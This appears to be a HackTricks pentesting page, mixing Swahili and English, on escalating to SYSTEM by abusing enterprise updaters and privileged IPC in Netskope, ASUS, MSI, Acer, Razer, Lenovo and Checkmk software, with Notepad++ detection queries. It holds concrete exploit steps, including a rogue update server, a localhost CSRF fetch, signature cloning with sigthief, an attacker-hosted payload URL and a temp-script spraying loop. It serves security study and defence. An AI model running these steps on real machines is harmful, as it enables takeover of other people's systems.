# Kuboresha Enterprise Auto-Updaters na Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unapanua daraja la Windows local privilege escalation lililopatikana katika enterprise endpoint agents na updaters ambazo zinaonyesha low-friction IPC surface na privileged update flow. Mfano wa kawaida ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo mtumiaji wa chini ya haki anaweza kulazimisha enrollment kwenda kwenye server inayodhibitiwa na mshambuliaji kisha kuwasilisha MSI mbaya ambayo huduma ya SYSTEM hu-install.

Mawazo muhimu unayoweza kutumia dhidi ya bidhaa zinazofanana:
- Abuse privileged service’s localhost IPC ili kulazimisha re-enrollment au reconfiguration kwenda kwenye attacker server.
- Implement vendor’s update endpoints, wasilisha rogue Trusted Root CA, na elekeza updater kwenye package mbaya, “signed”.
- Evade weak signer checks (CN allow-lists), optional digest flags, na lax MSI properties.
- Ikiwa IPC ni “encrypted”, derive the key/IV from world-readable machine identifiers zilizohifadhiwa kwenye registry.
- Ikiwa service inazuia callers kwa image path/process name, inject ndani ya process iliyo kwenye allow-list au ianzishe ikiwa suspended na bootstrap DLL yako kupitia minimal thread-context patch.

---
## 1) Kulazimisha enrollment kwenda kwenye attacker server kupitia localhost IPC

Wakala wengi huja na user-mode UI process ambayo huzungumza na SYSTEM service kupitia localhost TCP kwa kutumia JSON.

Iliyobainika kwenye Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Tengeneza JWT enrollment token ambayo claims zake hudhibiti backend host (e.g., AddonUrl). Tumia alg=None hivyo signature hahitajiki.
2) Tuma IPC message inayowaita provisioning command pamoja na JWT yako na tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Huduma inaanza kugonga rogue server yako kwa enrollment/config, k.m.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Kama caller verification ni path/name-based, anzisha request kutoka kwa allow-listed vendor binary (ona §4).

---
## 2) Hijacking update channel ili ku-run code kama SYSTEM

Mara client inapoongea na server yako, implement endpoints zinazotarajiwa na elekeza hadi attacker MSI. Typical sequence:

1) /v2/config/org/clientconfig → Rudisha JSON config yenye updater interval fupi sana, k.m.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Return a PEM CA certificate. The service installs it into the Local Machine Trusted Root store.
3) /v2/checkupdate → Supply metadata pointing to a malicious MSI and a fake version.

Bypassing common checks seen in the wild:
- Signer CN allow-list: the service may only check the Subject CN equals “netSkope Inc” or “Netskope, Inc.”. Your rogue CA can issue a leaf with that CN and sign the MSI.
- CERT_DIGEST property: include a benign MSI property named CERT_DIGEST. No enforcement at install.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) disables extra cryptographic validation.

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

Patch-bypass lesson: if a vendor responds by allow-listing a small set of “trusted” domains instead of cryptographically authenticating the update source, look for vendor-owned redirectors or reverse proxies that still let you steer traffic. In Netskope's case, public follow-up research showed that an R129-era allow-list could still be abused through `rproxy.goskope.com`, which proxied attacker-controlled Azure App Service content. Treat hostname allow-lists as a speed bump, not as a trust boundary.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

When facing a new endpoint agent or motherboard “helper” suite, a quick workflow is usually enough to tell whether you are looking at a promising privesc target:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Orodhesha candidate named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Chimbua data ya routing inayotegemea registry inayotumiwa na seva za IPC zinazotegemea plugin:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Toa majina ya endpoint, JSON keys, na command IDs kutoka kwa user-mode client kwanza. Packed Electron/.NET frontends mara nyingi huvuja full schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Tafuta predicate halisi ya trust, si tu code path ambayo hatimaye huzindua process:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns worth prioritizing:
- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` usually means “certificate exists” was treated as “certificate is trusted”, enabling certificate cloning or other fake-signer tricks.
- Substring/suffix checks over `Origin`, `Referer`, download URLs, process names, or signer CNs are not authentication. `contains(".vendor.com")` is usually exploitable with attacker-controlled lookalike domains.
- If the low-privileged GUI decides “the file is trusted” and the SYSTEM broker merely consumes that result, patching or reimplementing the client-side DLL/JS often bypasses the boundary entirely (Razer-style split validation).
- If the broker copies a payload to `%TEMP%`/`C:\Windows\Temp` and then validates or schedules it from that path, immediately test for TOCTOU replacement windows and for sibling plugin modules that expose alternate `ExecuteTask()` wrappers with weaker checks.

For named-pipe-heavy targets, PipeViewer is a quick way to spot weak DACLs and remotely reachable pipes before you start reversing the protocol in depth.

If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

A newer variation worth hunting is the **signed-client RPC broker**: a low-privileged Lenovo-signed desktop process talks to a SYSTEM service, and the service routes JSON commands into a set of XML-described add-ins under `%ProgramData%`. Once code execution is achieved **inside any accepted signed client**, every `runas="system"` contract becomes part of your attack surface.

High-value primitives observed in Lenovo Vantage research:
- **Trusting the caller because it is signed by the vendor**: researchers reached an authenticated context by copying a Lenovo-signed EXE to a writable directory and satisfying a DLL side-load (`profapi.dll`) so arbitrary code ran inside a client the service already trusted.
- **Manifest-driven attack surface discovery**: add-ins are declared under `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; several contracts run as `SYSTEM`, so enumerating those manifests often reveals the real privileged verbs faster than reversing the broker itself.
- **Per-command bugs behind the authenticated channel**: once inside the trusted client, public research found path-traversal + race conditions in update/install verbs, raw-SQL abuse in privileged settings databases, and substring-based registry path checks that enabled writes outside the intended hive.

Useful recon on a target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Mchango wa vitendo: kila wakati helper suite inapofichua broker ambayo kwanza huthibitisha **caller process** na kisha ndipo husambaza kwenye amri kadhaa za plugin/add-in, usiishie baada ya kupita kwenye ukaguzi wa uaminifu wa mlango wa mbele. Toa manifest/contract table na fanyia fuzz kila high-privilege verb kivyake; authenticated channel kawaida huficha bugs kadhaa za hatua ya pili.

---
## 1) Browser-to-localhost CSRF dhidi ya privileged HTTP APIs (ASUS DriverHub)

DriverHub husafirishwa na user-mode HTTP service (ADU.exe) kwenye 127.0.0.1:53000 ambayo husubiri browser calls zinazoingia kutoka https://driverhub.asus.com. Origin filter hufanya tu `string_contains(".asus.com")` juu ya Origin header na juu ya download URLs zinazooneshwa na `/asus/v1.0/*`. Hivyo, host yoyote inayodhibitiwa na mshambulizi kama `https://driverhub.asus.com.attacker.tld` hupita check hiyo na inaweza kutuma state-changing requests kutoka JavaScript. Tazama [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) kwa bypass patterns za ziada.

Practical flow:
1) Sajili domain ambayo ina ` .asus.com` na host webpage hasidi humo.
2) Tumia `fetch` au XHR kuita privileged endpoint (kwa mfano, `Reboot`, `UpdateApp`) kwenye `http://127.0.0.1:53000`.
3) Tuma JSON body inayotarajiwa na handler – packed frontend JS inaonesha schema hapa chini.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Hata PowerShell CLI iliyoonyeshwa hapa chini inafanikiwa hata wakati kichwa cha Origin kinapodanganywa kuwa thamani inayoaminika:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` inapakua arbitrary executables zilizofafanuliwa kwenye JSON body na huzihifadhi kwenye `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation hutumia tena same substring logic, hivyo `http://updates.asus.com.attacker.tld:8000/payload.exe` inakubaliwa. Baada ya download, ADU.exe huangalia tu kuwa PE ina signature na kwamba Subject string inalingana na ASUS kabla ya kuiendesha – hakuna `WinVerifyTrust`, hakuna chain validation.

Ili weaponize flow hii:
1) Create a payload (mfano, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer ndani yake (mfano, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` kwenye domain inayofanana na `.asus.com` na trigger UpdateApp kupitia browser CSRF hapo juu.

Kwa sababu Origin na URL filters zote ni substring-based na signer check inalinganisha strings tu, DriverHub huvuta na ku-execute attacker binary chini ya elevated context yake.

---
## 1) TOCTOU ndani ya updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service hutoa TCP protocol ambapo kila frame ni `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Core component (Component ID `0f 27 00 00`) husafirisha `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Handler yake:
1) Hunakili executable iliyotolewa kwenda `C:\Windows\Temp\MSI Center SDK.exe`.
2) Huthibitisha signature kupitia `CS_CommonAPI.EX_CA::Verify` (certificate subject lazima iwe sawa na “MICRO-STAR INTERNATIONAL, CO., LTD.” na `WinVerifyTrust` ifanikiwe).
3) Huunda scheduled task ambayo huendesha temp file kama SYSTEM na attacker-controlled arguments.

File iliyonakiliwa haifungwi kati ya verification na `ExecuteTask()`. Attacker anaweza:
- Kutuma Frame A ikielekeza kwenye legitimate MSI-signed binary (inahakikisha signature check inapita na task inawekwa kwenye queue).
- Kuifanyia race kwa messages za Frame B zinazoelekeza kwenye malicious payload, zikiondoverwrite `MSI Center SDK.exe` mara tu verification inapoisha.

Scheduler ikisababisha execution, huendesha overwritten payload chini ya SYSTEM licha ya kwamba faili la awali lilithibitishwa. Reliable exploitation hutumia goroutines/threads mbili zinazospam `CMD_AutoUpdateSDK` hadi TOCTOU window ishindwe.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Kila plugin/DLL inayoloadwa na `MSI.CentralServer.exe` hupokea Component ID iliyohifadhiwa chini ya `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Bytes 4 za kwanza za frame huchagua component hiyo, kuruhusu attackers kuelekeza commands kwa arbitrary modules.
- Plugins zinaweza kufafanua own task runners. `Support\API_Support.dll` hutoa `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` na moja kwa moja huita `API_Support.EX_Task::ExecuteTask()` bila **signature validation** – user yeyote wa local anaweza kui-pointa kwenye `C:\Users\<user>\Desktop\payload.exe` na kupata SYSTEM execution kwa uhakika.
- Sniffing loopback kwa Wireshark au ku-instrument .NET binaries kwenye dnSpy haraka huonyesha Component ↔ command mapping; custom Go/ Python clients basi zinaweza replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) hutoa `\\.\pipe\treadstone_service_LightMode`, na discretionary ACL yake inaruhusu remote clients (mfano, `\\TARGET\pipe\treadstone_service_LightMode`). Kutuma command ID `7` pamoja na file path huinvoke routine ya service ya process-spawning.
- Client library serializes a magic terminator byte (113) pamoja na args. Dynamic instrumentation kwa Frida/`TsDotNetLib` (ona [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) kwa instrumentation tips) huonyesha kuwa native handler hu-map value hii kwenda `SECURITY_IMPERSONATION_LEVEL` na integrity SID kabla ya kuita `CreateProcessAsUser`.
- Kubadilisha 113 (`0x71`) na 114 (`0x72`) huangukia generic branch inayohifadhi full SYSTEM token na kuweka high-integrity SID (`S-1-16-12288`). Binary iliyozinduliwa hivyo huendesha kama unrestricted SYSTEM, kwa local na cross-machine.
- Changanya hilo na exposed installer flag (`Setup.exe -nocheck`) ili kuanzisha ACC hata kwenye lab VMs na kujaribu pipe bila vendor hardware.

These IPC bugs zinaonyesha kwa nini localhost services lazima zitekeleze mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) na kwa nini kila module’s “run arbitrary binary” helper lazima ishare same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 iliongeza pattern nyingine muhimu kwenye family hii: user wa low-privileged anaweza kuomba COM helper azindue process kupitia `RzUtility.Elevator`, huku trust decision ikikabidhiwa user-mode DLL (`simple_service.dll`) badala ya kutekelezwa kwa uthabiti ndani ya privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` ili kuomba elevated launch.
- Katika public PoC, PE-signature gate ndani ya `simple_service.dll` inapata patched out kabla ya kutuma request, ikiruhusu arbitrary attacker-chosen executable kuzinduliwa.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Mwisho mkuu: wakati wa kureverse suites za “helper”, usiishie kwenye localhost TCP au named pipes. Angalia COM classes zenye majina kama `Elevator`, `Launcher`, `Updater`, au `Utility`, kisha thibitisha kama service yenye privileges kweli inavalidate target binary yenyewe au inamwamini tu result iliyohesabiwa na patchable user-mode client DLL. Pattern hii inaenda zaidi ya Razer: design yoyote ya split ambapo high-privilege broker inapokea allow/deny decision kutoka upande wa low-privilege ni candidate privesc surface.


---
## Predictable temp script execution during MSI repair (Checkmk Agent / CVE-2024-0670)

Baadhi ya Windows agents bado hutekeleza actions zenye privileges kwa kuandika temporary `.cmd` ndani ya `C:\Windows\Temp` na kui-execute kama `SYSTEM`. Ikiwa filename ni predictable na service haifanyi safely recreate ya existing files, user wa low-privilege anaweza ku-create mapema future temp file kama **read-only** na kufanya process yenye privileges i-execute content inayodhibitiwa na attacker badala ya script yake yenyewe.

Imeonekana kwenye vulnerable Checkmk Agent builds:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: MSI **repair** ya cached agent package

Practical workflow:
1. Kadiria realistic PID range kutoka current process IDs au running agent PID.
2. Andika short **ASCII** `.cmd` payload (`Set-Content -Encoding Ascii` au `cmd.exe` redirection; epuka UTF-16 PowerShell output kwa batch files).
3. Spray `C:\Windows\Temp\cmk_all_<PID>_1.cmd` kwenye candidate range na weka kila file kuwa read-only.
4. Trigger repair ya cached MSI ili privileged service ijaribu regenerate kisha i-execute temp script.
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Ikiwa bidhaa iliyo na udhaifu imewekwa kwa kutumia Windows Installer, linganisha MSI iliyohifadhiwa kwenye cache yenye muonekano wa nasibu chini ya `C:\Windows\Installer` na jina lake la bidhaa kabla ya kuchochea repair:
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operational notes:
- `qwinsta` ni muhimu wakati `msiexec /fa` inashindwa kutoka kwenye non-interactive WinRM shell na unahitaji kuelewa kama existing desktop/disconnected session inaweza ku-trigger repair kwa usahihi.
- This pattern generalizes to other endpoint agents and updaters that **stage temp scripts in world-writable locations and later execute them as SYSTEM**. Test for predictable names, missing exclusive create semantics, and repair/update flows that can be triggered on demand.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Between June 2025 and December 2025, attackers who compromised the hosting infrastructure behind the Notepad++ update flow selectively served malicious manifests to chosen victims. Older WinGUp-based updaters did not fully verify update authenticity, so a hostile XML response could redirect clients to attacker-controlled URLs. Because the client accepted HTTPS content without enforcing both a trusted certificate chain and a valid PE signature on the downloaded installer, victims fetched and executed a trojanized NSIS `update.exe`.

Operational flow (no local exploit required):
1. **Infrastructure interception**: compromise CDN/hosting and answer update checks with attacker metadata pointing at a malicious download URL.
2. **Trojanized NSIS**: the installer fetches/executes a payload and abuses two execution chains:
- **Bring-your-own signed binary + sideload**: bundle the signed Bitdefender `BluetoothService.exe` and drop a malicious `log.dll` in its search path. When the signed binary runs, Windows sideloads `log.dll`, which decrypts and reflectively loads the Chrysalis backdoor (Warbird-protected + API hashing to hinder static detection).
- **Scripted shellcode injection**: NSIS executes a compiled Lua script that uses Win32 APIs (e.g., `EnumWindowStationsW`) to inject shellcode and stage Cobalt Strike Beacon.

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.
- Notepad++ responded by strengthening WinGUp in v8.8.9 and later: the returned XML is now signed (XMLDSig), and newer builds enforce certificate + signature verification of the downloaded installer instead of trusting the transport alone.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> inazindua installer isiyo ya Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Mifumo hii hujumuisha updater yoyote inayokubali unsigned manifests au kushindwa ku-pin installer signers—network hijack + malicious installer + BYO-signed sideloading huzalisha remote code execution chini ya kivuli cha “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
